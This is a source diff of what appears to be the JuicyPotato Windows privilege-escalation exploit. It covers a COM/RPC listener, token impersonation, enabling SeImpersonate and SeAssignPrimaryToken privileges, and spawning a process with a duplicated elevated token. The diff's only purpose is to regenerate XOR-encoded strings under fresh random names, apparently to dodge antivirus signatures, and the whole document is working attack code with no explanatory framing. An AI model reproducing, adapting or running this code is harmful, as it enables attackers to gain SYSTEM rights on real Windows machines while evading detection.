-for(char &x : hid_bind_f_iEeLVsXPiLME){
-x = x ^ k_fqiCdX9it8OD;
+	 char  hid_bind_f_a35vBXKFaD7d[] = {'\x27','\x2c','\x2b','\x21','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
+ char  k_xcAj8PQmBORl = '\x45';
+for( char  &x : hid_bind_f_a35vBXKFaD7d){
+x = x ^ k_xcAj8PQmBORl;
 }
 
-	 char  hid_listen_nBhbBS1jNv13[] = {'\x29','\x2c','\x36','\x31','\x20','\x2b','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
-char k_ahLZMSG3Nb81 = '\x45';
-for(char &x : hid_listen_nBhbBS1jNv13){
-x = x ^ k_ahLZMSG3Nb81;
+	 char  hid_listen_yzb99iOgcVC8[] = {'\x29','\x2c','\x36','\x31','\x20','\x2b','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
+ char  k_JbAUmD4kVgm9 = '\x45';
+for( char  &x : hid_listen_yzb99iOgcVC8){
+x = x ^ k_JbAUmD4kVgm9;
 }
 
-	 char  hid_accept_QGJKFMowdJhr[] = {'\x24','\x26','\x26','\x20','\x35','\x31','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
-char k_uOIpgXNwxRr4 = '\x45';
-for(char &x : hid_accept_QGJKFMowdJhr){
-x = x ^ k_uOIpgXNwxRr4;
+	 char  hid_accept_NKUFktRJLKWD[] = {'\x24','\x26','\x26','\x20','\x35','\x31','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
+ char  k_uWtnCTaQ7Jex = '\x45';
+for( char  &x : hid_accept_NKUFktRJLKWD){
+x = x ^ k_uWtnCTaQ7Jex;
 }
 
-	 char  hid_COM____Vm1aP8TeZ70W[] = {'\x6','\xa','\x8','\x65','\x68','\x7b','\x65','\x36','\x20','\x2b','\x21','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
-char k_sG8wKi1UAVOZ = '\x45';
-for(char &x : hid_COM____Vm1aP8TeZ70W){
-x = x ^ k_sG8wKi1UAVOZ;
+	 char  hid_COM____uC17z9DUwU3A[] = {'\x6','\xa','\x8','\x65','\x68','\x7b','\x65','\x36','\x20','\x2b','\x21','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
+ char  k_i6sSL5PiQyV4 = '\x45';
+for( char  &x : hid_COM____uC17z9DUwU3A){
+x = x ^ k_i6sSL5PiQyV4;
 }
 
-	 char  hid_COM____OZaS3ZIGrYJg[] = {'\x6','\xa','\x8','\x65','\x68','\x7b','\x65','\x37','\x20','\x26','\x33','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
-char k_dscovTRi9WCS = '\x45';
-for(char &x : hid_COM____OZaS3ZIGrYJg){
-x = x ^ k_dscovTRi9WCS;
+	 char  hid_COM____aE5bpkRrFq3D[] = {'\x6','\xa','\x8','\x65','\x68','\x7b','\x65','\x37','\x20','\x26','\x33','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
+ char  k_HQ1QBC7HPHLb = '\x45';
+for( char  &x : hid_COM____aE5bpkRrFq3D){
+x = x ^ k_HQ1QBC7HPHLb;
 }
 
-	 char  hid_shutdo_FSbMkZekAOfI[] = {'\x36','\x2d','\x30','\x31','\x21','\x2a','\x32','\x2b','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
-char k_Bc3iDmNjv9tV = '\x45';
-for(char &x : hid_shutdo_FSbMkZekAOfI){
-x = x ^ k_Bc3iDmNjv9tV;
+	 char  hid_shutdo_ooSGpPsME8xC[] = {'\x36','\x2d','\x30','\x31','\x21','\x2a','\x32','\x2b','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
+ char  k_Pfh0EXEYPd3A = '\x45';
+for( char  &x : hid_shutdo_ooSGpPsME8xC){
+x = x ^ k_Pfh0EXEYPd3A;
 }
 const int DEFAULT_BUFLEN = 4096;
 	WSADATA wsaData;
@@ -495,7 +495,7 @@ const int DEFAULT_BUFLEN = 4096;
 	// Initialize Winsock
 	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
 	if (iResult != 0) {
-		printf(hid_WSASta_aENoHv6qzv1x, iResult);
+		printf(hid_WSASta_uItENExTGaQa, iResult);
 		return 1;
 	}
 
@@ -513,7 +513,7 @@ const int DEFAULT_BUFLEN = 4096;
 	iResult = getaddrinfo(NULL, dcom_port, &hints, &result);
 
 	if (iResult != 0) {
-		printf(hid_getadd_VPm8BoJJl8V6, iResult);
+		printf(hid_getadd_WLGyGAeaJYOT, iResult);
 		WSACleanup();
 		return 1;
 	}
@@ -524,7 +524,7 @@ const int DEFAULT_BUFLEN = 4096;
 	setsockopt(ListenSocket, SOL_SOCKET, SO_REUSEADDR, (char *)&optval, sizeof(optval));
 
 	if (ListenSocket == INVALID_SOCKET) {
-		printf(hid_socket_FlVFBRlQYHMt, WSAGetLastError());
+		printf(hid_socket_xNyt2V3FSaAZ, WSAGetLastError());
 		freeaddrinfo(result);
 		WSACleanup();
 		return 1;
@@ -534,7 +534,7 @@ const int DEFAULT_BUFLEN = 4096;
 	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
 	//printf("startCOMListener bindresult%d\n", iResult);
 	if (iResult == SOCKET_ERROR) {
-		printf(hid_bind_f_iEeLVsXPiLME, WSAGetLastError());
+		printf(hid_bind_f_a35vBXKFaD7d, WSAGetLastError());
 		freeaddrinfo(result);
 		closesocket(ListenSocket);
 		WSACleanup();
@@ -545,7 +545,7 @@ const int DEFAULT_BUFLEN = 4096;
 
 	iResult = listen(ListenSocket, SOMAXCONN);
 	if (iResult == SOCKET_ERROR) {
-		printf(hid_listen_nBhbBS1jNv13, WSAGetLastError());
+		printf(hid_listen_yzb99iOgcVC8, WSAGetLastError());
 		closesocket(ListenSocket);
 		WSACleanup();
 		return 1;
@@ -562,7 +562,7 @@ const int DEFAULT_BUFLEN = 4096;
 	{
 		ClientSocket = accept(ListenSocket, NULL, NULL);
 		if (ClientSocket == INVALID_SOCKET) {
-			printf(hid_accept_QGJKFMowdJhr, WSAGetLastError());
+			printf(hid_accept_NKUFktRJLKWD, WSAGetLastError());
 			closesocket(ListenSocket);
 			WSACleanup();
 			return 1;
@@ -596,7 +596,7 @@ const int DEFAULT_BUFLEN = 4096;
 			iSendResult = send(ClientSocket, sendbuf, *len, 0);
 
 			if (iSendResult == SOCKET_ERROR) {
-				printf(hid_COM____Vm1aP8TeZ70W, WSAGetLastError());
+				printf(hid_COM____uC17z9DUwU3A, WSAGetLastError());
 				exit(-11);
 			}
 
@@ -612,7 +612,7 @@ const int DEFAULT_BUFLEN = 4096;
 		}
 		else {
 			if (!TEST_mode)
-				printf(hid_COM____OZaS3ZIGrYJg, WSAGetLastError());
+				printf(hid_COM____aE5bpkRrFq3D, WSAGetLastError());
 
 			shutdown(ClientSocket, SD_SEND);
 			WSACleanup();
@@ -626,7 +626,7 @@ const int DEFAULT_BUFLEN = 4096;
 	iResult = shutdown(ClientSocket, SD_SEND);
 	//	printf("startCOMListener iResult ComLisetner:%d\n", iResult);
 	if (iResult == SOCKET_ERROR) {
-		printf(hid_shutdo_FSbMkZekAOfI, WSAGetLastError());
+		printf(hid_shutdo_ooSGpPsME8xC, WSAGetLastError());
 		closesocket(ClientSocket);
 		WSACleanup();
 		exit(-1);
@@ -641,23 +641,23 @@ const int DEFAULT_BUFLEN = 4096;
 BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
 {
 	
-	 char  hid_Priv_L_62Ui5nJgABUK[] = {'\x15','\x37','\x2c','\x33','\x65','\x9','\x2a','\x2a','\x2e','\x30','\x35','\x65','\x3','\x4','\x9','\x16','\x0','\x4f','\x45'};
-char k_ypISkni7cjgr = '\x45';
-for(char &x : hid_Priv_L_62Ui5nJgABUK){
-x = x ^ k_ypISkni7cjgr;
+	 char  hid_Priv_L_m7oUjtSV1X0T[] = {'\x15','\x37','\x2c','\x33','\x65','\x9','\x2a','\x2a','\x2e','\x30','\x35','\x65','\x3','\x4','\x9','\x16','\x0','\x4f','\x45'};
+ char  k_fLh1ZtGXZ2Om = '\x45';
+for( char  &x : hid_Priv_L_m7oUjtSV1X0T){
+x = x ^ k_fLh1ZtGXZ2Om;
 }
 
-	 char  hid_Priv_A_46uSKkSxxgHi[] = {'\x15','\x37','\x2c','\x33','\x65','\x4','\x21','\x2f','\x30','\x36','\x31','\x65','\x3','\x4','\x9','\x16','\x0','\x4f','\x45'};
-char k_NYfqIsWU5BtA = '\x45';
-for(char &x : hid_Priv_A_46uSKkSxxgHi){
-x = x ^ k_NYfqIsWU5BtA;
+	 char  hid_Priv_A_IILabSygyB4V[] = {'\x15','\x37','\x2c','\x33','\x65','\x4','\x21','\x2f','\x30','\x36','\x31','\x65','\x3','\x4','\x9','\x16','\x0','\x4f','\x45'};
+ char  k_e9OrSLmULOU2 = '\x45';
+for( char  &x : hid_Priv_A_IILabSygyB4V){
+x = x ^ k_e9OrSLmULOU2;
 }
 TOKEN_PRIVILEGES tp;
 	LUID luid;
 
 	if (!LookupPrivilegeValue(NULL, priv, &luid))
 	{
-		printf(hid_Priv_L_62Ui5nJgABUK);
+		printf(hid_Priv_L_m7oUjtSV1X0T);
 		return FALSE;
 	}
 
@@ -672,7 +672,7 @@ TOKEN_PRIVILEGES tp;
 		(PTOKEN_PRIVILEGES)NULL,
 		(PDWORD)NULL))
 	{
-		printf(hid_Priv_A_46uSKkSxxgHi);
+		printf(hid_Priv_A_IILabSygyB4V);
 		return FALSE;
 	}
 
@@ -683,20 +683,20 @@ TOKEN_PRIVILEGES tp;
 int wmain(int argc, wchar_t** argv)
 {
 	
-	 char  hid________YUMV4x2kt9yh[] = {'\x74','\x77','\x72','\x6b','\x75','\x6b','\x75','\x6b','\x74','\x45'};
-char k_mxSs3bPapUZu = '\x45';
-for(char &x : hid________YUMV4x2kt9yh){
-x = x ^ k_mxSs3bPapUZu;
+	 char  hid________Jd6ry4jULGai[] = {'\x74','\x77','\x72','\x6b','\x75','\x6b','\x75','\x6b','\x74','\x45'};
+ char  k_BmJbwUyJUyQc = '\x45';
+for( char  &x : hid________Jd6ry4jULGai){
+x = x ^ k_BmJbwUyJUyQc;
 }
 
-	 char  hid_Wrong__2MGXNDY5tZLQ[] = {'\x12','\x37','\x2a','\x2b','\x22','\x65','\x4','\x37','\x22','\x30','\x28','\x20','\x2b','\x31','\x7f','\x65','\x60','\x36','\x4f','\x45'};
-char k_GRfe3RHoYjym = '\x45';
-for(char &x : hid_Wrong__2MGXNDY5tZLQ){
-x = x ^ k_GRfe3RHoYjym;
+	 char  hid_Wrong__cHM7mcty4NDZ[] = {'\x12','\x37','\x2a','\x2b','\x22','\x65','\x4','\x37','\x22','\x30','\x28','\x20','\x2b','\x31','\x7f','\x65','\x60','\x36','\x4f','\x45'};
+ char  k_ujTMk5MlDC4A = '\x45';
+for( char  &x : hid_Wrong__cHM7mcty4NDZ){
+x = x ^ k_ujTMk5MlDC4A;
 }
 BOOL brute = FALSE;
 
-	strcpy(dcom_ip, hid________YUMV4x2kt9yh);
+	strcpy(dcom_ip, hid________Jd6ry4jULGai);
 	while ((argc > 1) && (argv[1][0] == '-'))
 	{
 		switch (argv[1][1])
@@ -760,7 +760,7 @@ BOOL brute = FALSE;
 				break;
 
 			default:
-				printf(hid_Wrong__2MGXNDY5tZLQ, argv[1]);
+				printf(hid_Wrong__cHM7mcty4NDZ, argv[1]);
 				usage();
 				exit(-1);
 		}
@@ -791,76 +791,76 @@ BOOL brute = FALSE;
 int Juicy(wchar_t *clsid, BOOL brute)
 {
 	
-	 char  hid_Testin_fngdR005TqWf[] = {'\x11','\x20','\x36','\x31','\x2c','\x2b','\x22','\x65','\x60','\x16','\x65','\x60','\x16','\x4f','\x45'};
-char k_DAzp7ntmQ1fS = '\x45';
-for(char &x : hid_Testin_fngdR005TqWf){
-x = x ^ k_DAzp7ntmQ1fS;
+	 char  hid_Testin_vIgFQ78MTTNl[] = {'\x11','\x20','\x36','\x31','\x2c','\x2b','\x22','\x65','\x60','\x16','\x65','\x60','\x16','\x4f','\x45'};
+ char  k_WKtHgxemfJn3 = '\x45';
+for( char  &x : hid_Testin_vIgFQ78MTTNl){
+x = x ^ k_WKtHgxemfJn3;
 }
 
-	 char  hid______a_iK6In2UmHc4e[] = {'\x4f','\x1e','\x6e','\x18','\x65','\x24','\x30','\x31','\x2d','\x37','\x20','\x36','\x30','\x29','\x31','\x65','\x60','\x21','\x4f','\x45'};
-char k_R6xkzTFUmKxH = '\x45';
-for(char &x : hid______a_iK6In2UmHc4e){
-x = x ^ k_R6xkzTFUmKxH;
+	 char  hid______a_gE5x7KKKZxM4[] = {'\x4f','\x1e','\x6e','\x18','\x65','\x24','\x30','\x31','\x2d','\x37','\x20','\x36','\x30','\x29','\x31','\x65','\x60','\x21','\x4f','\x45'};
+ char  k_WS3hw9cLfZzl = '\x45';
+for( char  &x : hid______a_gE5x7KKKZxM4){
+x = x ^ k_WS3hw9cLfZzl;
 }
 
-	 wchar_t  hid_S_e_I__NUNM0FudrWPR[] = {'\x16','\x45','\x20','\x45','\xc','\x45','\x28','\x45','\x35','\x45','\x20','\x45','\x37','\x45','\x36','\x45','\x2a','\x45','\x2b','\x45','\x24','\x45','\x31','\x45','\x20','\x45','\x15','\x45','\x37','\x45','\x2c','\x45','\x33','\x45','\x2c','\x45','\x29','\x45','\x20','\x45','\x22','\x45','\x20','\x45','\x45'};
-char k_iwGFauLUW5Rq = '\x45';
-for(char &x : hid_S_e_I__NUNM0FudrWPR){
-x = x ^ k_iwGFauLUW5Rq;
+	 wchar_t  hid_S_e_I__lLfIGBxP9Yqc[] = {'\x16','\x20','\xc','\x28','\x35','\x20','\x37','\x36','\x2a','\x2b','\x24','\x31','\x20','\x15','\x37','\x2c','\x33','\x2c','\x29','\x20','\x22','\x20','\x45'};
+ wchar_t  k_F4vSlTWBFiUk = '\x45';
+for( wchar_t  &x : hid_S_e_I__lLfIGBxP9Yqc){
+x = x ^ k_F4vSlTWBFiUk;
 }
 
-	 wchar_t  hid_S_e_A__Jn5bQqteWBTJ[] = {'\x16','\x45','\x20','\x45','\x4','\x45','\x36','\x45','\x36','\x45','\x2c','\x45','\x22','\x45','\x2b','\x45','\x15','\x45','\x37','\x45','\x2c','\x45','\x28','\x45','\x24','\x45','\x37','\x45','\x3c','\x45','\x11','\x45','\x2a','\x45','\x2e','\x45','\x20','\x45','\x2b','\x45','\x15','\x45','\x37','\x45','\x2c','\x45','\x33','\x45','\x2c','\x45','\x29','\x45','\x20','\x45','\x22','\x45','\x20','\x45','\x45'};
-char k_9fQer08I5ycX = '\x45';
-for(char &x : hid_S_e_A__Jn5bQqteWBTJ){
-x = x ^ k_9fQer08I5ycX;
+	 wchar_t  hid_S_e_A__QH4NzeMIlkFS[] = {'\x16','\x20','\x4','\x36','\x36','\x2c','\x22','\x2b','\x15','\x37','\x2c','\x28','\x24','\x37','\x3c','\x11','\x2a','\x2e','\x20','\x2b','\x15','\x37','\x2c','\x33','\x2c','\x29','\x20','\x22','\x20','\x45'};
+ wchar_t  k_xExJ6kOP2EJa = '\x45';
+for( wchar_t  &x : hid_S_e_A__QH4NzeMIlkFS){
+x = x ^ k_xExJ6kOP2EJa;
 }
 
-	 char  hid_____Er_Rp5Wj8M8wqLb[] = {'\x1e','\x68','\x18','\x65','\x0','\x37','\x37','\x2a','\x37','\x65','\x22','\x20','\x31','\x31','\x2c','\x2b','\x22','\x65','\x31','\x2a','\x2e','\x20','\x2b','\x65','\x31','\x3c','\x35','\x20','\x7f','\x65','\x20','\x37','\x37','\x2a','\x37','\x65','\x26','\x2a','\x21','\x20','\x65','\x75','\x3d','\x60','\x29','\x3d','\x4f','\x45'};
-char k_N1lc09brXqiN = '\x45';
-for(char &x : hid_____Er_Rp5Wj8M8wqLb){
-x = x ^ k_N1lc09brXqiN;
+	 char  hid_____Er_BmNpSLAuTpIX[] = {'\x1e','\x68','\x18','\x65','\x0','\x37','\x37','\x2a','\x37','\x65','\x22','\x20','\x31','\x31','\x2c','\x2b','\x22','\x65','\x31','\x2a','\x2e','\x20','\x2b','\x65','\x31','\x3c','\x35','\x20','\x7f','\x65','\x20','\x37','\x37','\x2a','\x37','\x65','\x26','\x2a','\x21','\x20','\x65','\x75','\x3d','\x60','\x29','\x3d','\x4f','\x45'};
+ char  k_EF9F8P2jekpR = '\x45';
+for( char  &x : hid_____Er_BmNpSLAuTpIX){
+x = x ^ k_EF9F8P2jekpR;
 }
 
-	 char  hid_Error__U9iucL6Kdtiq[] = {'\x0','\x37','\x37','\x2a','\x37','\x65','\x22','\x20','\x31','\x31','\x2c','\x2b','\x22','\x65','\x31','\x2a','\x2e','\x20','\x2b','\x65','\x31','\x3c','\x35','\x20','\x7f','\x65','\x20','\x37','\x37','\x2a','\x37','\x65','\x26','\x2a','\x21','\x20','\x65','\x75','\x3d','\x60','\x29','\x3d','\x4f','\x45'};
-char k_g0p1W5Rf2OfO = '\x45';
-for(char &x : hid_Error__U9iucL6Kdtiq){
-x = x ^ k_g0p1W5Rf2OfO;
+	 char  hid_Error__QCWDfDwGwI07[] = {'\x0','\x37','\x37','\x2a','\x37','\x65','\x22','\x20','\x31','\x31','\x2c','\x2b','\x22','\x65','\x31','\x2a','\x2e','\x20','\x2b','\x65','\x31','\x3c','\x35','\x20','\x7f','\x65','\x20','\x37','\x37','\x2a','\x37','\x65','\x26','\x2a','\x21','\x20','\x65','\x75','\x3d','\x60','\x29','\x3d','\x4f','\x45'};
+ char  k_pxu8FyImCiFH = '\x45';
+for( char  &x : hid_Error__QCWDfDwGwI07){
+x = x ^ k_pxu8FyImCiFH;
 }
 
-	 char  hid______C_iNBCAA3611tN[] = {'\x4f','\x1e','\x68','\x18','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x12','\x2c','\x31','\x2d','\x11','\x2a','\x2e','\x20','\x2b','\x12','\x65','\x3','\x24','\x2c','\x29','\x20','\x21','\x65','\x31','\x2a','\x65','\x26','\x37','\x20','\x24','\x31','\x20','\x65','\x35','\x37','\x2a','\x26','\x7f','\x65','\x60','\x21','\x4f','\x45'};
-char k_CDvmrNiWevhs = '\x45';
-for(char &x : hid______C_iNBCAA3611tN){
-x = x ^ k_CDvmrNiWevhs;
+	 char  hid______C_Zu2pgm5UcPuL[] = {'\x4f','\x1e','\x68','\x18','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x12','\x2c','\x31','\x2d','\x11','\x2a','\x2e','\x20','\x2b','\x12','\x65','\x3','\x24','\x2c','\x29','\x20','\x21','\x65','\x31','\x2a','\x65','\x26','\x37','\x20','\x24','\x31','\x20','\x65','\x35','\x37','\x2a','\x26','\x7f','\x65','\x60','\x21','\x4f','\x45'};
+ char  k_qhNns20pq5WP = '\x45';
+for( char  &x : hid______C_Zu2pgm5UcPuL){
+x = x ^ k_qhNns20pq5WP;
 }
 
-	 char  hid______C_GWahrEOeZoo3[] = {'\x4f','\x1e','\x6e','\x18','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x12','\x2c','\x31','\x2d','\x11','\x2a','\x2e','\x20','\x2b','\x12','\x65','\xa','\xe','\x4f','\x45'};
-char k_pUPOqaw82Eyh = '\x45';
-for(char &x : hid______C_GWahrEOeZoo3){
-x = x ^ k_pUPOqaw82Eyh;
+	 char  hid______C_MlHYQMkKxfU7[] = {'\x4f','\x1e','\x6e','\x18','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x12','\x2c','\x31','\x2d','\x11','\x2a','\x2e','\x20','\x2b','\x12','\x65','\xa','\xe','\x4f','\x45'};
+ char  k_gdc8CnWqXeTb = '\x45';
+for( char  &x : hid______C_MlHYQMkKxfU7){
+x = x ^ k_gdc8CnWqXeTb;
 }
 
-	 wchar_t  hid_C______IW6bzlbjgPnv[] = {'\x6','\x45','\x7f','\x45','\x19','\x45','\x45'};
-char k_Vc7HNLSnm8gM = '\x45';
-for(char &x : hid_C______IW6bzlbjgPnv){
-x = x ^ k_Vc7HNLSnm8gM;
+	 wchar_t  hid_C______41QZlshR6T86[] = {'\x6','\x7f','\x19','\x45'};
+ wchar_t  k_Y3Q8POGYkGGO = '\x45';
+for( wchar_t  &x : hid_C______41QZlshR6T86){
+x = x ^ k_Y3Q8POGYkGGO;
 }
 
-	 char  hid______C_h206o4Xh7jeQ[] = {'\x4f','\x1e','\x68','\x18','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x4','\x36','\x10','\x36','\x20','\x37','\x65','\x3','\x24','\x2c','\x29','\x20','\x21','\x65','\x31','\x2a','\x65','\x26','\x37','\x20','\x24','\x31','\x20','\x65','\x35','\x37','\x2a','\x26','\x7f','\x65','\x60','\x21','\x4f','\x45'};
-char k_TvgsiU2b2faB = '\x45';
-for(char &x : hid______C_h206o4Xh7jeQ){
-x = x ^ k_TvgsiU2b2faB;
+	 char  hid______C_MzeK8sk5ytC5[] = {'\x4f','\x1e','\x68','\x18','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x4','\x36','\x10','\x36','\x20','\x37','\x65','\x3','\x24','\x2c','\x29','\x20','\x21','\x65','\x31','\x2a','\x65','\x26','\x37','\x20','\x24','\x31','\x20','\x65','\x35','\x37','\x2a','\x26','\x7f','\x65','\x60','\x21','\x4f','\x45'};
+ char  k_jcLeQ4ly5gzm = '\x45';
+for( char  &x : hid______C_MzeK8sk5ytC5){
+x = x ^ k_jcLeQ4ly5gzm;
 }
 
-	 char  hid______C_CeKdmUX42TIt[] = {'\x4f','\x1e','\x6e','\x18','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x4','\x36','\x10','\x36','\x20','\x37','\x65','\xa','\xe','\x4f','\x45'};
-char k_TyAzNhr73Y5W = '\x45';
-for(char &x : hid______C_CeKdmUX42TIt){
-x = x ^ k_TyAzNhr73Y5W;
+	 char  hid______C_0z8XJ7rdcajQ[] = {'\x4f','\x1e','\x6e','\x18','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x4','\x36','\x10','\x36','\x20','\x37','\x65','\xa','\xe','\x4f','\x45'};
+ char  k_NsKFI3UNyi5F = '\x45';
+for( char  &x : hid______C_0z8XJ7rdcajQ){
+x = x ^ k_NsKFI3UNyi5F;
 }
 
-	 char  hid_Waitin_zA80QY28QQHd[] = {'\x12','\x24','\x2c','\x31','\x2c','\x2b','\x22','\x65','\x23','\x2a','\x37','\x65','\x24','\x30','\x31','\x2d','\x6b','\x6b','\x6b','\x45'};
-char k_lUoXWSsxn4Zd = '\x45';
-for(char &x : hid_Waitin_zA80QY28QQHd){
-x = x ^ k_lUoXWSsxn4Zd;
+	 char  hid_Waitin_FpYggDcy34T8[] = {'\x12','\x24','\x2c','\x31','\x2c','\x2b','\x22','\x65','\x23','\x2a','\x37','\x65','\x24','\x30','\x31','\x2d','\x6b','\x6b','\x6b','\x45'};
+ char  k_hUMhYkvLf7Ea = '\x45';
+for( char  &x : hid_Waitin_FpYggDcy34T8){
+x = x ^ k_hUMhYkvLf7Ea;
 }
 PotatoAPI* test = new PotatoAPI();
 	test->startCOMListenerThread();
@@ -869,7 +869,7 @@ PotatoAPI* test = new PotatoAPI();
 		olestr = clsid;
 
 	if (!TEST_mode)
-		printf(hid_Testin_fngdR005TqWf, olestr, g_port);
+		printf(hid_Testin_vIgFQ78MTTNl, olestr, g_port);
 
 
 	test->startRPCConnectionThread();
@@ -887,7 +887,7 @@ PotatoAPI* test = new PotatoAPI();
 			TOKEN_PRIVILEGES tkp;
 			SECURITY_DESCRIPTOR sdSecurityDescriptor;
 			if (!TEST_mode)
-				printf(hid______a_iK6In2UmHc4e, test->negotiator->authResult);
+				printf(hid______a_gE5x7KKKZxM4, test->negotiator->authResult);
 
 			fflush(stdout);
 
@@ -896,8 +896,8 @@ PotatoAPI* test = new PotatoAPI();
 				TOKEN_ALL_ACCESS, &hToken))return 0;
 
 			//enable privileges
-			EnablePriv(hToken, hid_S_e_I__NUNM0FudrWPR);
-			EnablePriv(hToken, hid_S_e_A__Jn5bQqteWBTJ);
+			EnablePriv(hToken, hid_S_e_I__lLfIGBxP9Yqc);
+			EnablePriv(hToken, hid_S_e_A__QH4NzeMIlkFS);
 			PTOKEN_TYPE ptg;
 			DWORD dwl = 0;
 			HANDLE hProcessToken;
@@ -911,7 +911,7 @@ PotatoAPI* test = new PotatoAPI();
 
 			GetTokenInformation(elevated_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
 			if (!dwl)
-				printf(hid_____Er_Rp5Wj8M8wqLb, GetLastError());
+				printf(hid_____Er_BmNpSLAuTpIX, GetLastError());
 
 			result = DuplicateTokenEx(elevated_token,
 				TOKEN_ALL_ACCESS,
@@ -923,7 +923,7 @@ PotatoAPI* test = new PotatoAPI();
 
 			GetTokenInformation(duped_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
 			if (!dwl)
-				printf(hid_Error__U9iucL6Kdtiq, GetLastError());
+				printf(hid_Error__QCWDfDwGwI07, GetLastError());
 
 			DWORD SessionId;
 			PROCESS_INFORMATION pi;
@@ -963,11 +963,11 @@ PotatoAPI* test = new PotatoAPI();
 
 				if (!result)
 				{
-					printf(hid______C_iNBCAA3611tN, GetLastError());
+					printf(hid______C_Zu2pgm5UcPuL, GetLastError());
 				}
 				else
 				{
-					printf(hid______C_GWahrEOeZoo3);
+					printf(hid______C_MlHYQMkKxfU7);
 					break;
 				}
 			} 
@@ -981,14 +981,14 @@ PotatoAPI* test = new PotatoAPI();
 					command,
 					nullptr, nullptr,
 					FALSE, 0, nullptr,
-					hid_C______IW6bzlbjgPnv, &si, &pi
+					hid_C______41QZlshR6T86, &si, &pi
 				);
 
 				if (!result) {
-					printf(hid______C_h206o4Xh7jeQ, GetLastError());
+					printf(hid______C_MzeK8sk5ytC5, GetLastError());
 				}
 				else {
-					printf(hid______C_CeKdmUX42TIt);
+					printf(hid______C_0z8XJ7rdcajQ);
 					break;
 				}
 			}//end argv
@@ -996,7 +996,7 @@ PotatoAPI* test = new PotatoAPI();
 			if (!result)
 				break;
 			else {
-				printf(hid_Waitin_zA80QY28QQHd);
+				printf(hid_Waitin_FpYggDcy34T8);
 				Sleep(500);
 				fflush(stdout);
 			}
